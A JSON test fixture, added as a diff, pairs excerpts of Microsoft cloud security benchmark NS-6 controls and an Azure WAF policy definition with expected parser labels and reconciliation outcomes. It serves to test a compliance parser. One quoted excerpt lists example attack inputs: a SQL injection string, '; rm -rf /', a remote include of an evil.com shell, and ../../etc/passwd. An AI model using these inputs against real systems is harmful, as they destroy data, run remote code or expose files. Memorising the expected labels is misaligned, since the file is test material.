@@ -1,0 +1,285 @@
+{
+  "description": "Actual downloaded official source excerpts, captured 2026-10-29. Expected identifiers and semantic labels were reviewed separately from parser predictions. Excerpt hashes differ from full-original hashes. Structural labels are review-only, not an enterprise adoption decision.",
+  "cases": [
+    {
+      "id": "asb-v2-ns6",
+      "edition": "asb-v2",
+      "role": "domain",
+      "source_url": "https://learn.microsoft.com/en-us/security/benchmark/azure/security-controls-v2-network-security",
+      "original_sha256": "1960555ac5565ce1c0961d0e8520ccf620a243f806e5aae6a5006680decc4b34",
+      "excerpt_sha256": "9f1f6ef129e8ba3b129ad0cf58774c93cf04480a572e6badada9c2d6a8aa31af",
+      "source_excerpt": "## NS-6: Simplify network security rules\r\n\r\n| Azure ID | CIS Controls v7.1 ID(s) | NIST SP 800-53 r4 ID(s) |\r\n| --- | --- | --- |\r\n| NS-6 | 1.5 | IA-4 |\r\n\r\nSimplify network security rules by leveraging service tags and application security groups (ASGs).\r\n\r\nUse Virtual Network service tags to define network access controls on network security groups or Azure Firewall. You can use service tags in place of specific IP addresses when creating security rules. By specifying the service tag name in the source or destination field of a rule, you can allow or deny the traffic for the corresponding service. Microsoft manages the address prefixes encompassed by the service tag and automatically updates the service tag as addresses change.\r\n\r\nYou can also use application security groups to help simplify complex security configuration. Instead of defining policy based on explicit IP addresses in network security groups, application security groups enable you to configure network security as a natural extension of an application's structure, allowing you to group virtual machines and define network security policies based on those groups.\r\n\r\n- [Understand and use service tags](/en-us/azure/virtual-network/service-tags-overview)\r\n- [Understand and use application security groups](/en-us/azure/virtual-network/network-security-groups-overview#application-security-groups)\r\n\r\n**Responsibility**: Customer\r\n\r\n**Customer Security Stakeholders** ([Learn more](/en-us/azure/cloud-adoption-framework/organize/cloud-security#security-functions)):\r\n\r\n- [Security architecture](/en-us/azure/cloud-adoption-framework/organize/cloud-security-architecture)\r\n- [Posture management](/en-us/azure/cloud-adoption-framework/organize/cloud-security-posture-management)\r\n- [Application Security and DevOps](/en-us/azure/cloud-adoption-framework/organize/cloud-security-application-security-devsecops)\r\n\r\n",
+      "attribution": "Microsoft Learn / Microsoft Corporation",
+      "license": "CC-BY-4.0; https://learn.microsoft.com/en-us/legal/termsofuse",
+      "expected_control": {
+        "control_id": "NS-6",
+        "title": "Simplify network security rules",
+        "security_principle": null,
+        "subcontrols": [],
+        "mappings": [
+          [
+            "cis-controls",
+            "7.1",
+            "1.5"
+          ],
+          [
+            "nist-sp-800-53",
+            "4",
+            "IA-4"
+          ]
+        ],
+        "alternatives": [],
+        "explicit_alternatives": null
+      },
+      "expected_successors": [],
+      "expected_policy": null,
+      "expected_publication": "unknown"
+    },
+    {
+      "id": "mcsb-v1-ns6",
+      "edition": "mcsb-v1",
+      "role": "domain",
+      "source_url": "https://learn.microsoft.com/en-us/security/benchmark/azure/mcsb-network-security",
+      "original_sha256": "f0d38be4ad7c9a15ed4398a96f32930b626d3d56e86a47ef790ffadd8f83e9d6",
+      "excerpt_sha256": "4678449dc3c7e16f3a5359aeb19437f07a9bd5a3328d9f2aac5c2270da19e106",
+      "source_excerpt": "## NS-6: Deploy web application firewall\r\n\r\n| CIS Controls v8 ID(s) | NIST SP 800-53 r4 ID(s) | PCI-DSS ID(s) v3.2.1 |\r\n| --- | --- | --- |\r\n| 13.10 | SC-7 | 1.1, 1.2, 1.3 |\r\n\r\n**Security principle**: Deploy a web application firewall (WAF) and configure the appropriate rules to protect your web applications and APIs from application-specific attacks. \r\n\r\n**Azure guidance**: Use web application firewall (WAF) capabilities in Azure Application Gateway, Azure Front Door, and Azure Content Delivery Network (CDN) to protect your applications, services and APIs against application layer attacks at the edge of your network.\r\n\r\nSet your WAF in \"detection\" or \"prevention mode\", depending on your needs and threat landscape.\r\n\r\nChoose a built-in ruleset, such as OWASP Top 10 vulnerabilities, and tune it to your application needs.\r\n\r\n**Azure implementation and additional context**:\r\n\r\n- [How to deploy Azure WAF](/en-us/azure/web-application-firewall/overview)\r\n\r\n**AWS guidance**: Use AWS Web Application Firewall (WAF) in Amazon CloudFront distribution, Amazon API Gateway, Application Load Balancer, or AWS AppSync to protect your applications, services and APIs against application layer attacks at the edge of your network.\r\n\r\nUse AWS Managed Rules for WAF to deploy built-in baseline groups and customize it to your application needsfor the user-case rule groups.\r\n\r\nTo simplify the WAF rules deployment, you can also use the AWS WAF Security Automations solution to automatically deploy pre-defined AWS WAF rules that filters web-based attacks on your web ACL.\r\n\r\n**AWS implementation and additional context**:\r\n\r\n- [How AWS WAF works](https://docs.aws.amazon.com/waf/latest/developerguide/how-aws-waf-works.html)\r\n- [AWS WAF Security Automations](https://aws.amazon.com/solutions/implementations/security-automations-for-aws-waf/)\r\n- [AWS Managed Rules for AWS WAF](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups.html)\r\n\r\n**GCP guidance**: Use Google Cloud Armor to help protect your applications and websites against denial of service and web attacks.\r\n\r\nUse Google Cloud Armor out-of-the box rules based on industry standards to mitigate common web-application vulnerabilities and help provide protection from OWASP Top 10.\r\n\r\nSetup your preconfigured WAF rules, each consisting of multiple signatures sourced from ModSecurity Core Rules (CRS). Each signature corresponds to an attack detection rule in the ruleset.\r\n\r\nCloud Armor works in conjunction with external load balancers and protects from distributed denial-of-service (DDoS) and other web-based attacks, whether the applications are deployed on Google Cloud, in a hybrid deployment, or in a multi-cloud architecture. Security policies can be configured manually, with configurable match conditions, and actions in a security policy. Cloud Armor also features preconfigured security policies, which cover a variety of use cases.\r\n\r\nAdaptive Protection in Cloud Armor helps you prevent, detect and protect your application and services from L7 distributed attacks by analyzing patterns of traffic to your backend services, detecting and alerting suspected attacks, and generating suggested WAF rules to mitigate such attacks. These rules can be fine-tuned to meet your needs.\r\n\r\n**GCP implementation and additional context**:\r\n\r\n- [Google Cloud Armor](https://cloud.google.com/armor)\r\n- [Apigee documentation](https://cloud.google.com/apigee/docs)\r\n- [Integrating Google Cloud Armor with other Google products](https://cloud.google.com/armor/docs/integrating-cloud-armor)\r\n\r\n**Customer security stakeholders ([Learn more](/en-us/azure/cloud-adoption-framework/organize/cloud-security#security-functions))**:\r\n\r\n- [Security architecture](/en-us/azure/cloud-adoption-framework/organize/cloud-security-architecture)\r\n- [Posture management](/en-us/azure/cloud-adoption-framework/organize/cloud-security-posture-management)\r\n- [Application Security and DevOps](/en-us/azure/cloud-adoption-framework/organize/cloud-security-application-security-devsecops)\r\n\r\n",
+      "attribution": "Microsoft Learn / Microsoft Corporation",
+      "license": "CC-BY-4.0; https://learn.microsoft.com/en-us/legal/termsofuse",
+      "expected_control": {
+        "control_id": "NS-6",
+        "title": "Deploy web application firewall",
+        "security_principle": "Deploy a web application firewall (WAF) and configure the appropriate rules to protect your web applications and APIs from application-specific attacks.",
+        "subcontrols": [],
+        "mappings": [
+          [
+            "cis-controls",
+            "8",
+            "13.10"
+          ],
+          [
+            "nist-sp-800-53",
+            "4",
+            "SC-7"
+          ],
+          [
+            "pci-dss",
+            "3.2.1",
+            "1.1"
+          ],
+          [
+            "pci-dss",
+            "3.2.1",
+            "1.2"
+          ],
+          [
+            "pci-dss",
+            "3.2.1",
+            "1.3"
+          ]
+        ],
+        "alternatives": [
+          "Azure Application Gateway",
+          "Azure Front Door",
+          "Azure Content Delivery Network"
+        ],
+        "explicit_alternatives": null
+      },
+      "expected_successors": [],
+      "expected_policy": null,
+      "expected_publication": "unknown"
+    },
+    {
+      "id": "mcsb-v2-ns6",
+      "edition": "mcsb-v2",
+      "role": "domain",
+      "source_url": "https://learn.microsoft.com/en-us/security/benchmark/azure/mcsb-v2-network-security",
+      "original_sha256": "0f655442a8c80e7e1be7c543daeb4c1f780c8da1cf30880d19b12d539d88ce12",
+      "excerpt_sha256": "75ae94b7f3003873cc32eea55c6e9b215ec820599eafe6999394931715581bd3",
+      "source_excerpt": "## NS-6: Deploy web application firewall\r\n\r\n*Azure Policy:* See [Azure built-in policy definitions: NS-6](mcsb-v2-controls-policy-mapping#ns-6).\r\n\r\n### Security principle\r\n\r\nDeploy a web application firewall (WAF) and configure rules to safeguard web applications and APIs from application-specific attacks by inspecting, detecting, and filtering malicious HTTP/HTTPS traffic.\r\n\r\n### Risk to mitigate\r\n\r\nAttackers exploit web application vulnerabilities to gain unauthorized access, execute malicious code, steal credentials, or exfiltrate data.\r\n\r\n- **Injection attacks (e.g., SQL injection, command injection):** Attackers exploit input validation vulnerabilities to inject malicious code into web application queries or commands, enabling unauthorized database access, data exfiltration, or system compromise. SQL injection (SQLi) manipulates backend queries (e.g., appending ' OR '1'='1 to a login form), while command injection executes arbitrary OS commands (e.g., ; rm -rf / via a form field).\r\n- **HTTP protocol violations and malformed requests:** Attackers send malformed HTTP requests (e.g., invalid headers, oversized payloads, or non-standard methods like TRACE) to exploit vulnerabilities in web servers or applications, potentially causing crashes or unauthorized access. These attacks target misconfigured servers or unpatched frameworks.\r\n- **Bot-driven attacks (e.g., credential stuffing, scraping)**: Automated bots launch credential stuffing attacks (e.g., brute-forcing login endpoints with stolen credentials) or scrape sensitive content (e.g., pricing data), overloading servers or compromising user accounts. These attacks exploit weak authentication or unprotected APIs.\r\n- **Application-specific exploits (e.g., remote file Inclusion, local file inclusion):** Attackers exploit vulnerabilities to include malicious files (e.g., include 'http://evil.com/shell.php') or access local server files (e.g., ../../etc/passwd) via manipulated URL parameters or form inputs, enabling code execution or data exposure.\r\n\r\n### MITRE ATT&CK\r\n\r\n- **Initial Access (TA0001):** Exploits SQL injection, XSS, or remote file inclusion to gain entry (e.g., T1190 - Exploit Public-Facing Application).\r\n- **Execution (TA0002):** Executes malicious code via command injection, RFI, or XSS (e.g., T1059 - Command and Scripting Interpreter).\r\n- **Credential Access (TA0006):** Steals credentials through XSS or credential stuffing (e.g., T1539 - Steal Web Session Cookie, T1110 - Brute Force).\r\n- **Collection (TA0009):** Gathers data via SQL injection or scraping (e.g., T1213 - Data from Information Repositories).\r\n\r\n### NS-6.1: Configure Azure WAF with appropriate rules\r\n\r\nEnable web application firewall (WAF) capabilities in Azure Application Gateway, Azure Front Door, or Azure Content Delivery Network (CDN) to protect applications and APIs from web-based attacks. Select the appropriate service based on application requirements, configure WAF policies with built-in and custom rules, set the policy mode based on security posture, and associate the policy with the service endpoint:\r\n\r\n- **Select the appropriate WAF service:** Choose Azure Application Gateway for VNet-hosted applications, Azure Front Door for global edge delivery, or Azure CDN for content-heavy workloads based on application requirements and architecture.\r\n- **Configure WAF policies with built-in and custom rules:** Start with common built-in rulesets such as OWASP Core Rule Set (CRS 3.2) and bot protection (Microsoft Bot Manager) rules. Add custom rules (e.g., rate-limiting for &gt;100 requests/min) and exclusions to reduce false positives based on threat landscape and application security profile.\r\n- **Set WAF policy mode:** Use detection mode initially or for non-critical applications to avoid disrupting legitimate traffic during setup and rule optimization. Switch to prevention mode for critical applications once rules are validated to block malicious requests.\r\n- **Associate WAF policy with service endpoint:** Associate the WAF policy with the Application Gateway, Front Door, or CDN endpoint to ensure all HTTP/HTTPS traffic is routed through WAF for inspection.\r\n\r\n### Implementation example\r\n\r\nAn organization needed to protect customer-facing web applications and APIs from SQL injection, XSS attacks, and bot-driven credential stuffing while maintaining performance for legitimate users.\r\n\r\n**Challenge:** The organization had web applications deployed globally with no protection against OWASP Top 10 vulnerabilities, resulting in multiple SQL injection attempts, bot-driven attacks overwhelming login endpoints, and no visibility into malicious traffic patterns. Applications lacked rate-limiting controls, allowing API abuse and credential stuffing attacks, and there was no mechanism to distinguish legitimate users from malicious bots.\r\n\r\n**Solution approach:**\r\n\r\n- **WAF service selection:** Deployed [Azure Application Gateway with WAF](/en-us/azure/web-application-firewall/ag/ag-overview) for VNet-hosted applications and [Azure Front Door with WAF](/en-us/azure/web-application-firewall/afds/afds-overview) for globally distributed applications requiring edge protection and low-latency access.\r\n- **Built-in protection rulesets:** Enabled [OWASP Core Rule Set (CRS) 3.2](/en-us/azure/web-application-firewall/ag/application-gateway-crs-rulegroups-rules) to protect against SQL injection, cross-site scripting (XSS), remote file inclusion, and other common web vulnerabilities, and activated [Microsoft Bot Manager rules](/en-us/azure/web-application-firewall/ag/bot-protection) to identify and block malicious bots while allowing legitimate search engine crawlers and monitoring services.\r\n- **Custom rules for specific threats:** Implemented rate-limiting rules blocking clients exceeding 100 requests per minute to prevent API abuse and credential stuffing, geo-filtering rules blocking traffic from high-risk regions where services are unavailable, and IP reputation-based rules blocking requests from known malicious IP ranges identified through threat intelligence feeds.\r\n- **Exclusion management:** Created targeted exclusions for legitimate business scenarios such as /checkout endpoints with complex form inputs that triggered false positives in OWASP rules, /upload endpoints handling large file submissions, and /api endpoints with unusual but valid header patterns from mobile applications.\r\n- **Detection to prevention transition:** Started WAF in detection mode for two weeks to identify false positives, refined rules and exclusions based on legitimate traffic patterns, then transitioned to prevention mode for production applications to actively block threats while maintaining business continuity.\r\n\r\n**Outcome:** The organization eliminated SQL injection and XSS exploitation attempts, substantially reduced bot-driven attacks through bot manager rules, and established comprehensive visibility into web application threats. Rate-limiting controls prevented API abuse and credential stuffing, while the phased transition from detection to prevention mode ensured legitimate users experienced no service disruption.\r\n\r\n### Criticality level\r\n\r\nMust have.\r\n\r\n### Control mapping\r\n\r\n- **NIST SP 800-53 Rev.5:** SC-7, SC-7(5), SI-10, SI-10(1), SI-11\r\n- **PCI-DSS v4:** 6.4.1, 6.4.2, 11.4.7\r\n- **CIS Controls v8.1:** 13.2, 13.9\r\n- **NIST CSF v2.0:** PR.AC-05, PR.PT-05, DE.CM-04\r\n- **ISO 27001:2022:** A.8.20, A.8.22, A.8.25\r\n- **SOC 2:** CC6.1, CC6.6, CC7.2\r\n\r\n",
+      "attribution": "Microsoft Learn / Microsoft Corporation",
+      "license": "CC-BY-4.0; https://learn.microsoft.com/en-us/legal/termsofuse",
+      "expected_control": {
+        "control_id": "NS-6",
+        "title": "Deploy web application firewall",
+        "security_principle": "Deploy a web application firewall (WAF) and configure rules to safeguard web applications and APIs from application-specific attacks by inspecting, detecting, and filtering malicious HTTP/HTTPS traffic.",
+        "subcontrols": [
+          "NS-6.1"
+        ],
+        "mappings": [
+          [
+            "nist-sp-800-53",
+            "5",
+            "SC-7"
+          ],
+          [
+            "nist-sp-800-53",
+            "5",
+            "SC-7(5)"
+          ],
+          [
+            "nist-sp-800-53",
+            "5",
+            "SI-10"
+          ],
+          [
+            "nist-sp-800-53",
+            "5",
+            "SI-10(1)"
+          ],
+          [
+            "nist-sp-800-53",
+            "5",
+            "SI-11"
+          ],
+          [
+            "pci-dss",
+            "4",
+            "6.4.1"
+          ],
+          [
+            "pci-dss",
+            "4",
+            "6.4.2"
+          ],
+          [
+            "pci-dss",
+            "4",
+            "11.4.7"
+          ],
+          [
+            "cis-controls",
+            "8.1",
+            "13.2"
+          ],
+          [
+            "cis-controls",
+            "8.1",
+            "13.9"
+          ],
+          [
+            "nist-csf",
+            "2.0",
+            "PR.AC-05"
+          ],
+          [
+            "nist-csf",
+            "2.0",
+            "PR.PT-05"
+          ],
+          [
+            "nist-csf",
+            "2.0",
+            "DE.CM-04"
+          ],
+          [
+            "iso-iec-27001",
+            "2022",
+            "A.8.20"
+          ],
+          [
+            "iso-iec-27001",
+            "2022",
+            "A.8.22"
+          ],
+          [
+            "iso-iec-27001",
+            "2022",
+            "A.8.25"
+          ],
+          [
+            "soc-2",
+            null,
+            "CC6.1"
+          ],
+          [
+            "soc-2",
+            null,
+            "CC6.6"
+          ],
+          [
+            "soc-2",
+            null,
+            "CC7.2"
+          ]
+        ],
+        "alternatives": [
+          "Azure Application Gateway",
+          "Azure Front Door",
+          "Azure Content Delivery Network"
+        ],
+        "explicit_alternatives": true
+      },
+      "expected_successors": [],
+      "expected_policy": null,
+      "expected_publication": "unknown"
+    },
+    {
+      "id": "mcsb-v2-published-succession",
+      "edition": "mcsb-v2",
+      "role": "overview",
+      "source_url": "https://learn.microsoft.com/en-us/security/benchmark/azure/overview",
+      "original_sha256": "8fd0f9fbc9991dad4509b8f5446784279cbf061a70e936dd5f9566152d143dc6",
+      "excerpt_sha256": "09a43940b84a32c192300a5d9a64aa8b8b07ab661e7a449b0c23f33fd0c974c4",
+      "source_excerpt": "# Overview of the Microsoft cloud security benchmark v2 (preview) | Microsoft Learn\n\nFor an introduction to the Microsoft cloud security benchmark project, including key concepts, implementation guidance, and terminology, see the [Microsoft cloud security benchmark introduction](introduction).\r\n\r\nThe Microsoft cloud security benchmark v2 (preview) provides enhanced Azure-focused guidance with expanded security domains and comprehensive technical implementation details. This version builds upon the foundation of the Microsoft cloud security benchmark with refined security controls, AI security guidance, and expanded Azure Policy mappings.\r\n\r\n## Key features\r\n\r\nNote\r\n\r\nMicrosoft cloud security benchmark v2 is currently in preview. This version supersedes [Microsoft cloud security benchmark v1](overview-mcsb-v1).",
+      "attribution": "Microsoft Learn / Microsoft Corporation",
+      "license": "CC-BY-4.0; https://learn.microsoft.com/en-us/legal/termsofuse",
+      "expected_control": null,
+      "expected_successors": [
+        [
+          "mcsb-v2",
+          "mcsb-v1"
+        ]
+      ],
+      "expected_policy": null,
+      "expected_publication": "preview"
+    },
+    {
+      "id": "waf-application-gateway-policy",
+      "edition": "mcsb-v2",
+      "role": "policy",
+      "source_url": "https://raw.githubusercontent.com/Azure/azure-policy/master/built-in-policies/policyDefinitions/Network/WAF_AppGatewayEnabled_Audit.json",
+      "original_sha256": "79205ed2399232632ae1b51ba89f2b7487820e76a2d57e77bf7230ffcc839968",
+      "excerpt_sha256": "79205ed2399232632ae1b51ba89f2b7487820e76a2d57e77bf7230ffcc839968",
+      "source_excerpt": "{\n  \"properties\": {\n    \"displayName\": \"Web Application Firewall (WAF) should be enabled for Application Gateway\",\n    \"description\": \"Deploy Azure Web Application Firewall (WAF) in front of public facing web applications for additional inspection of incoming traffic. Web Application Firewall (WAF) provides centralized protection of your web applications from common exploits and vulnerabilities such as SQL injections, Cross-Site Scripting, local and remote file executions. You can also restrict access to your web applications by countries, IP address ranges, and other http(s) parameters via custom rules.\",\n    \"policyType\": \"BuiltIn\",\n    \"mode\": \"Indexed\",\n    \"metadata\": {\n      \"version\": \"2.0.0\",\n      \"category\": \"Network\"\n    },\n    \"version\": \"2.0.0\",\n    \"parameters\": {\n      \"effect\": {\n        \"type\": \"String\",\n        \"metadata\": {\n          \"displayName\": \"Effect\",\n          \"description\": \"Enable or disable the execution of the policy\"\n        },\n        \"allowedValues\": [\n          \"Audit\",\n          \"Deny\",\n          \"Disabled\"\n        ],\n        \"defaultValue\": \"Audit\"\n      }\n    },\n    \"policyRule\": {\n      \"if\": {\n        \"allOf\": [\n          {\n            \"field\": \"type\",\n            \"equals\": \"Microsoft.Network/applicationGateways\"\n          },\n          {\n            \"field\": \"Microsoft.Network/applicationGateways/webApplicationFirewallConfiguration\",\n            \"exists\": \"false\"\n          },\n          {\n            \"field\": \"Microsoft.Network/applicationGateways/firewallPolicy\",\n            \"exists\": \"false\"\n          }\n        ]\n      },\n      \"then\": {\n        \"effect\": \"[parameters('effect')]\"\n      }\n    },\n    \"versions\": [\n      \"2.0.0\"\n    ]\n  },\n  \"id\": \"/providers/Microsoft.Authorization/policyDefinitions/564feb30-bf6a-4854-b4bb-0d2d2d1e6c66\",\n  \"name\": \"564feb30-bf6a-4854-b4bb-0d2d2d1e6c66\"\n}",
+      "attribution": "Microsoft Corporation / Azure azure-policy built-in policies",
+      "license": "MIT; https://github.com/Azure/azure-policy/blob/master/LICENSE",
+      "expected_control": null,
+      "expected_successors": [],
+      "expected_policy": {
+        "definition_id": "/providers/Microsoft.Authorization/policyDefinitions/564feb30-bf6a-4854-b4bb-0d2d2d1e6c66",
+        "version": "2.0.0",
+        "mode": "Indexed",
+        "resource_types": [
+          "Microsoft.Network/applicationGateways"
+        ]
+      },
+      "expected_publication": "unknown"
+    }
+  ],
+  "reconciliation": [
+    {
+      "old": "mcsb-v1-ns6",
+      "new": "mcsb-v2-ns6",
+      "expected_outcome": "more_specific_guidance",
+      "expected_change": "MINOR",
+      "expected_mapping_change": true,
+      "rationale": "Both recommend a WAF to protect web applications and APIs; v2 adds inspection detail and a subcontrol. MINOR is an additive guidance proposal requiring backward-compatibility review."
+    },
+    {
+      "old": "asb-v2-ns6",
+      "new": "mcsb-v1-ns6",
+      "expected_outcome": "distinct",
+      "expected_change": null,
+      "expected_mapping_change": true,
+      "rationale": "Same NS-6 identifier, different requirements: simplify network rules versus deploy a WAF. Never infer equivalence from identifiers alone."
+    },
+    {
+      "old": "mcsb-v1-ns6",
+      "new": "mcsb-v1-ns6",
+      "expected_outcome": "exact_duplicate",
+      "expected_change": null,
+      "expected_mapping_change": false,
+      "rationale": "Repeated reference to exactly the same captured source occurrence."
+    }
+  ]
+}
